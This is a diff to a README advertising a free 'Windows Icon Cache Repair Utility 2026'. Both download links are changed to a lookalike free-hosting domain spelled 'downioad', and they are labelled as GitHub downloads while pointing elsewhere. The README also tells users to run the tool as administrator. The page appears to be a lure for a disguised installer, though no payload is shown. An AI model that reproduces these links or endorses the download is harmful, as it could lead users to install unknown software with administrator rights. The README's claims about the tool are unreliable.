@@ -2,7 +2,7 @@
 
 Windows Icon Cache Repair Utility 2026 is a lightweight, free application designed to automatically rebuild and fix corrupted Windows icon cache files. If your desktop icons appear blank, show incorrect images, or display broken placeholders, this tool provides a quick and reliable solution for Windows 10 and Windows 11 users. Developed specifically for the 2026 Windows ecosystem, it ensures your system maintains crisp, accurate icon displays at all times without requiring any technical expertise.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -63,4 +63,4 @@ Always run the tool as an administrator to ensure it has the necessary permissio
 
 ## Get It Now
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
